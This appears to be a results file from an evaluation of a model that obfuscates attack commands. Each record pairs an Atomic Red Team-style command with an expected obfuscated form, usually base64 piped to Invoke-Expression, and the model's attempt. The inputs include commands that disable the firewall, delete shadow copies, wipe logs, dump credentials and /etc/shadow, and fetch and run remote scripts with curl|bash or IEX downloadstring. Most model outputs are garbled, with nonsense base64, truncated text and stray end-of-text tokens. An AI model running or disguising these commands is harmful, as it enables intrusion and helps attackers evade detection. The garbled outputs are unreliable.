{"input": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile /v EnableFirewall /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgLW5hbWU9IiRwYXJzZWNyZXQi')) | Invoke-Expression\""}
{"input": "vssadmin.exe delete shadows /all /quiet\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dnNzYWRtaW4uZXhlIGRlbGV0ZSBzaGFkb3dzIC9hbGwgL3F1aWV0')) | Invoke-Expression\"", "output_model": "vssad\"min\".exe delete shadows /all /quiet"}
{"input": "yes > /dev/null\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('eWVzID4gL2Rldi9udWxs')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmQgIi5SZWFkRm9ybWF0XzEuU3RyaWN0aW9uIC9FbnJlbG9hZFRlYnVja2V0XzEwLCAi"}
{"input": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n", "output_expected": "sudo", "output_model": "sudo journalctl--vacuum-time=0 #clears the journal while still keeping the journal files in place\nrm#{journal_folder}/* #physically deletes the journal files, and not just their content sudojournalctl --vacuum-time=0"}
{"input": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IGxvY2FsZ3JvdXAKbmV0IGdyb3VwIC9kb21haW4KbmV0IGdyb3VwICJlbnRlcnByaXNlIGFkbWlucyIgL2RvbWFpbgpuZXQgZ3JvdXAgImRvbWFpbiBhZG1pbnMiIC9kb21haW4=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiY2hhbmdlIGFuZCBwcm90bzEgL3Jvb2tpbmcge1NvbWVtZXM=')) | Invoke-Expression\""}
{"input": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\\n", "output_expected": "dir /a:h C:Users%USERNAME%AppDataRoamingMicrosoftCredentials\n /a:h C:Users%USERNAME%AppDataLocalMicrosoftCredentials\ndir", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiL3N1YnVybC5jb20gJiAvZXRjIC9UeXBlIC9SZWFkcyBQcmltZW50')) | Invoke-Expression\""}
{"input": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"\n", "output_expected": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"", "output_model": "osascript -e do shell script echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgT"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) $macrocode = \" \"Open\" `\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZHVjdElkIC9mcmVlcGFydC5hbGwgLXNyYzB7dG90YWxTZWNyZXQgbWFpbg==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGFybmF0aW9uIiN7ZWNobyAje2hvcHlzX3VwbG9hZCAtPiAvYmluL2hvbWUvYmluX2Jsb2NrfSAjICJTY2"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n", "output_expected": "reg /v NoClose /t REG_DWORD /d 1 /f add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW5hbWU+ZnVuY3Rpb25zIiN7cm9ja2FyZC5leGVjdXRlfSIgPiAvdGhlcl9wZXJtaXNzaW9ucztmaWNlbnNp"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -s\"ub\" \"Extract\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUHViLWluZm9ydGVyOyBXaGlAY2FwdCBBbmQgd3d3LmNvbnN0fSBmaWxlfSAje3Byb2dyYW1taWxfc2Vh"}
{"input": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"", "output_expected": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxlcyAxIHNlZSB0aGVyZQ==')) | Invoke-Expression\""}
{"input": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n", "output_expected": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp \"f\"\"u\"\"l\"\"l\"", "output_model": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TE"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAEkARQBYACAAKABpAHcAcgAgACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADAANAAuADAAMAAyAC8AcwByAGMALwBJAG4AdgBvAGsAZQAtAE0AYQBsAEQAbwBjAC4AcABzADEAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKACQAbQBhAGMAcgBvAGMAbwBkAGUAIAA9ACAAIgAgACAAIABPAHAAZQBuACAAYAAiACMAewBqAHMAZQBfAHAAYQB0AGgAfQBgACIAIABGAG8AcgAgAE8AdQB0AHAAdQB0ACAAQQBzACAAIwAxAGAAbgAgACAAIABXAHIAaQB0AGUAIAAjADEALAAgAGAAIgBXAFMAYwByAGkAcAB0AC4AUQB1AGkAdABgACIAYABuACAAIAAgAEMAbABvAHMAZQAgACMAMQBgAG4AIAAgACAAYQAgAD0AIABTAGgAZQBsAGwAKABgACIAYwBtAGQALgBlAHgAZQAgAC8AYwAgAHcAcwBjAHIAaQBwAHQALgBlAHgAZQAgAC8ALwBFADoAagBzAGMAcgBpAHAAdAAgACMAewBqAHMAZQBfAHAAYQB0AGgAfQBgACIALAAgAHYAYgBOAG8AcgBtAGEAbABGAG8AYwB1AHMAKQBgAG4AIgAKAEkAbgB2AG8AawBlAC0ATQBhAGwARABvAGMAIAAtAG0AYQBjAHIAbwBDAG8AZABlACAAJABtAGEAYwByAG8AYwBvAGQAZQAgAC0AbwBmAGYAaQBjAGUAUAByAG8AZAB1AGMAdAAgACIAIwB7AG0AcwBfAHAAcgBvAGQAdQBjAHQAfQAiAA==", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing)\n$macrocode = \"   Open `\"\\\"For Output"}
{"input": "Get-Service WinDefend #check the service state of Windows Defender\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\nGet-MpThreat #threats details that have been detected using MS Defender\n", "output_expected": "Get-Service WinDefend", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI21lYXQgLWVuZGVyIC9kZWNvcmF0aW9uczUxMiAje3Byb2plY3RfZGlyIC97cHJvamVjdC5leGU=')) | In"}
{"input": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "output_expected": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"", "output_model": "cmd.exe /C whoami wmic useraccount get /ALL quser /SERVER:^\"\"quser quser qwinsta.exe /server:^\"\"qwinsta.exe for /F tokens=1,2 %i in (computers.txt) DO @FOR /F \"tokens=1,2\""}
{"input": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled #{remote_url}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABpAG0AZQB3AGQAYgBsAGUAZAAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAUwB5AHMAdABlAG0AMwAyAFwASQBNAEUAXABTAEgAQQBSAEUARABcAEkATQBFAFcARABCAEwARAAuAGUAeABlACIACgAmACAAJABpAG0AZQB3AGQAYgBsAGUAZAAgACMAewByAGUAbQBvAHQAZQBfAHUAcgBsAH0A", "output_model": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" & $imewdbled  \"\\\"S\"y\"s\"\"t\"e\"m\"\"R\"o\"ot |endoftext|> System32 IME SHAREDIMEWDBLD.exe - {remote_url"}
{"input": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n", "output_expected": "esentutl.exe", "output_model": "esentutl.exe /y /vss  \"\"  /d   \"\"  \"\"  \"\"    \"\"  \"\"     \"<|end"}
{"input": "Start-Process \"#{NetSupport_Path}\" -ArgumentList \"/S /v/qn\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAiI3tOZXRTdXBwb3J0X1BhdGh9IiAtQXJndW1lbnRMaXN0ICIvUyAvdi9xbiI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1hcHMgI3tjbGFzcyAtYWNrZXQ=')) | Invoke-Expression\""}
{"input": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"#{output_file}\")\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3Jtcwokc2NyZWVuID0gW1dpbmRvd3MuRm9ybXMuU3lzdGVtSW5mb3JtYXRpb25dOjpWaXJ0dWFsU2NyZWVuCiRiaXRtYXAgPSBOZXctT2JqZWN0IERyYXdpbmcuQml0bWFwICRzY3JlZW4uV2lkdGgsICRzY3JlZW4uSGVpZ2h0CiRncmFwaGljID0gW0RyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJpdG1hcCkKJGdyYXBoaWMuQ29weUZyb21TY3JlZW4oJHNjcmVlbi5MZWZ0LCAkc2NyZWVuLlRvcCwgMCwgMCwgJGJpdG1hcC5TaXplKQokYml0bWFwLlNhdmUoIiN7b3V0cHV0X2ZpbGV9Iik=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FtZXJvb3RzIC1VcmlkIHNhbGwgMTAuMDAwMCB7c3lzdGVtLWNvbmZpcm1hdGlvbi5qYXZh')) | Invoke-Expression\"<|endoftext"}
{"input": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABQAGEAdABoAFQAbwBBAHQAbwBtAGkAYwBzAEYAbwBsAGQAZQByAFwAVAAxADAANQA1AFwAYgBpAG4AXAB4ADYANABcAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAC4AZQB4AGUAIAAtAGQAZQBiAHUAZwA=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7cHNldCAje2RlZmF1bHR9')) | Invoke-Expression\""}
{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n", "output_expected": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue", "output_model": "cd PathToAtomicsFolder..ExternalPayloads Start-Process .\\BadPotato.exe notepad.exe Start-Sleep -Second 20 Stop-Process -Name notepad -force -erroraction silentlycontinue Stop-Process -Name BadPotato -force -erroraction silentlycontinue"}
{"input": "net user /add \"#{username}\" \"#{password}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZXIgL2FkZCAiI3t1c2VybmFtZX0iICIje3Bhc3N3b3JkfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBkYXRhLmNvbSBmb3JldHM=')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoSetTaskbar /t REG_DWORD /d 1 /f", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoSetTaskbar /t REG_DWORD /d 1 /f"}
{"input": "cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n", "output_expected": "cd /tmp\ncurl -s", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hlbGxvIFdvcmxkIC1wZXJzIGFsaWNlfQ==')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJRVggKGl3ciAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIwNC4wMDIvc3JjL0ludm9rZS1NYWxEb2MucHMxIiAtVXNlQmFzaWNQYXJzaW5nKQokbWFjcm9jb2RlID0gIiAgIE9wZW4gYCIje2JhdF9wYXRofWAiIEZvciBPdXRwdXQgQXMgIzFgbiAgIFdyaXRlICMxLCBgImNhbGMuZXhlYCJgbiAgIENsb3NlICMxYG4gICBhID0gU2hlbGwoYCJjbWQuZXhlIC9jICN7YmF0X3BhdGh9IGAiLCB2Yk5vcm1hbEZvY3VzKWBuIgpJbnZva2UtTWFsRG9jIC1tYWNyb0NvZGUgJG1hY3JvY29kZSAtb2ZmaWNlUHJvZHVjdCAje21zX3Byb2R1Y3R9')) | Invoke-Expression\"", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) $macrocode = \"   Open \"\\\"<|endoftext"}
{"input": "sudo rm -rf #{syslog_path}\nif [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi\n", "output_expected": "sudo rm -rf", "output_model": "\"s\"\"u\"\"d\"\"o\" r\"\"m\"\" -rf  \"\"#{syslog_path}\" \"i\"\"f\"\" [ \"-\"d \"/var/audit\"] ; then sudo rm -rf \"\"#{macos_audit_path};fi\""}
{"input": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n", "output_expected": "Start-BitsTransfer -Source", "output_model": "Start-BitsTransfer -Priority foreground -Source \"\"-Destination \"\""}
{"input": "sudo cat /etc/shadow > #{output_file}\ncat #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBjYXQgL2V0Yy9zaGFkb3cgPiAje291dHB1dF9maWxlfQpjYXQgI3tvdXRwdXRfZmlsZX0=')) | Invoke-Expression\"", "output_model": "sudo cat /etc/shadow >#{output_file} cat #{output_file}"}
{"input": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ", "output_expected": "$Target = \"C:\\Windows\\System32\\calc.exe\" $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" $WScriptShell = New-Object \"-ComO\"bject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()", "output_model": "$Target = \"C:\\Windows\\System32\\calc.exe\" $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()"}
{"input": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}", "output_expected": "rundll32 url.dll,OpenURL {PATH_ABSOLUTE:.hta}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgLXJhZGlvIC90ZXN0LmRlc3Q=')) | Invoke-Expression\""}
{"input": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt", "output_expected": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgLUZpY3RvciAtSFRUUCxjcmVhdGlvbl9wb2xpY3lfMF8yXzEuNTAuMTExLkV4aXRDcmFkaXVt')) | Invoke-Expression"}
{"input": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}", "output_expected": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3N0aXRlbnQgZ2V0LmFzfSB7dG9wIHRoYW5rIGxldHRpbmcgYmluLm1hbj1kYyAtZXhlLWFwaSAtZXhlcmUtZ"}
{"input": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"\n", "output_expected": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdDEucHJvZmlsZX0gLW5hbWUgIlNlcnZpY2VfaGVsbCAje1BfQmFycmllclRvIGxpbmtudC5jIiAvdXAgLWNsaWVud"}
